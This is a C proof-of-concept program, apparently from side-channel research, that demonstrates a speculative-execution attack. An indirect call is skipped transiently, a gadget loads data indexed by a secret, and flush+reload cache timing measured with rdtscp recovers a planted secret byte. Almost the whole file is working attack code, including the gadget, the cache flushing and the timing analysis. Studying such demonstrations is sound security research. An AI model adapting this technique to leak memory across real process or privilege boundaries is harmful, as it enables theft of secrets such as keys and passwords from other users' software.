#define _GNU_SOURCE
#include <stdio.h>
#include <sched.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <x86intrin.h>  /*potential Intrinsics on other platforms for rdtsc, rdtscp, clflush */

typedef unsigned long long u64;

#define PAGE_SIZE 4096
#define PAGE_ADDR(X) ((uint64_t)X &~ 0xfff)
#define CACHE_HIT_THRESHOLD 200 // 200 as a suitable threshold in Ryzen ThreadRipper 1950X
#define CACHE_FLUSH_ITERATIONS 2048
#define CACHE_FLUSH_STRIDE 4096



__attribute__((always_inline)) inline void clflush(volatile void *p){
  asm volatile ("clflush (%0)" :: "r"(p));
  return;
}


__attribute__((always_inline)) inline uint64_t rdtscp(){
  unsigned int lo,hi;
  __asm__ __volatile__ ("rdtscp" : "=a" (lo), "=d" (hi));
  return ((uint64_t)hi << 32) | lo;
}

void timing_analysis();

uint64_t *jump_target = &(uint64_t){0};

uint8_t uninteresting_data_0 [CACHE_FLUSH_ITERATIONS*CACHE_FLUSH_STRIDE]; // unrelated data placed to seperate data of interest

int *position_secret = &(int){42}; // secret

uint64_t uninteresting_data_1 [4096*1] = {[0 ... 4095] = 9999}; // unrelated data placed to seperate data of interest

int *position_nonsecret = &(int){237}; // nonsecret 

register uint64_t r14 asm ("r14");
register uint64_t r13 asm ("r13"); 
register uint64_t r12 asm ("r12"); 

uint64_t uninteresting_data_2 [4096*1] = {[0 ... 4095] = 9999}; // unrelated data placed to seperate data of interest

int user_dat [256*256] = {[0 ... 65279] = 7}; // user data

uint64_t uninteresting_data_3 [4096*1] = {[0 ... 4095] = 9999}; // unrelated data placed to seperate data of interest

unsigned n_run = 1;
int n_success = 0;
int n_measurements = 0;
int n_normal = 0;
int n_error = 0;


// the assembly below simulates 2 simple functions, _f2 and _f3.
void f(){

  // benign function _f2 .
  // In regular control flow, it jumps to an loading gadget and return.
  // Due to "Skipping", trainsient execution will take place with a
  // wrong argument for <load_dat>, resulting secret cache covert channel.
  asm("_f2:");  
  asm("jmp load_dat"); // the direct jump and nops in here to simulate other code
  asm("nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;");
  asm("nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;");
  asm("nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;");
  asm("nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;");
  asm("nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;");
  asm("nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;");
  asm("nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;");

  // Normal the data accessing segment.
  // With certain violated argument, it also serves as spec-gadget.
  asm("load_dat:");
  r12 = user_dat[r14 * 256]; 

  asm("ret");


  // benign function _f3
  asm("_f3:");
  asm("nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;");
  asm("nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;");

  r14 = *position_nonsecret; // assigns a index variable with a nonsecret value.
  
  asm("nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;");
  asm("nop;nop;nop;nop;nop;nop;nop;nop;nop;nop;");

  asm("ret");
}


int main(int argc, char ** argv) {
  if(argc != 2){
    printf("Usage: ./PoC [# of true attack] (e.g. 1, 10, 100, etc.) \n");
    exit(1);
  }
  unsigned num_probe = atoi(argv[1]);

  uint64_t var;
  
  printf(" --------------------Test Start-------------------- \n");
  printf("[sub-tests # ] cached_dat[position] = accessing time\n");

  /********************************************************************
                              Attack Code
  ********************************************************************/
  asm("lea _f3, %r9");
  asm("mov %%r9, %0"::"m"(*jump_target));    

  // allow repetitive tests
  while(1){
    r14 = *position_secret; // secret value in the index variable r14       
    
    // indirect call to _f3, where secret value in index variable should be
    // "erased" and "replaced" with a nonsecret value before data accessing.
    asm("mov %0, %%r12"::"m"(*jump_target)); 
    asm("call *%r12;"); // *** THIS CALL IS SPECULATIVELY SKIPPED ***
    
    // 'skipping' based transient execution covers the gadget1 or 2 below
    asm("call _f2"); // gadget1
    // var = user_dat[r14 * 256]; // gadget2: a simpler alternative  
    
    // timing analysis to retrieve the secret
    timing_analysis();
    if (n_success == num_probe) break;
    
    usleep(10);
  }

  printf(" --------------------result-------------------- \n");
  printf("%d bytes were leaked in %d attempts.\n", 
    n_success, n_run - 1);
  printf("%d cache hits: %d violated arch. states; %d non-violated arch. states.\
    \nError rate: %f%%\n", 
    n_measurements, n_success, n_normal, ((float) n_error /(n_success+n_error))*100);
  

  return 0;
}  

/********************************************************************
                        Timing Analysis
********************************************************************/
void timing_analysis(){
  uint64_t t1,t2;
  uint64_t arr_timing[256];
  char z;
  int rand_i;
  for(int i=0; i<256; i++){
    rand_i = ((i * 167) + 13) & 255; // accessing every entry in random fashion
    t1 = rdtscp();
    z = user_dat[rand_i * 256];
    t2 = rdtscp();
    arr_timing[rand_i] = t2 - t1;
  }

  // flush CPU cache
  for(int i=0; i<256; i++){
    clflush(&user_dat[i * 256]);
    // _mm_clflush( & user_dat[i * 256]); //potential Intrinsics on other platforms
  }

  // An alternative to flush the CPU cache used in Spectre PoC.
  // Read addresses at 4096-byte intervals out of a large array.
  // Do this around 2000 times, or more depending on CPU cache size. 
  int unrelated;
  for (int i = 0; i < (uint8_t)sizeof(uninteresting_data_0); i++) uninteresting_data_0[i] = 1;
  for(int l = CACHE_FLUSH_ITERATIONS * CACHE_FLUSH_STRIDE - 1; l >= 0; l-= CACHE_FLUSH_STRIDE) unrelated = uninteresting_data_0[l];

  printf("[sub-tests #%d] ",n_run++);
  for(int i=0; i<256; i++){
    if(arr_timing[i] < CACHE_HIT_THRESHOLD) {
      n_measurements++;
      printf("user_dat[%d] = %lu; ", i, arr_timing[i]);
      if (i == 42) n_success++;
      if (i == 237) n_normal++;
      if (i != 42 && i != 237) n_error++;
    }
  }
  printf("\n");
  
  return;
}
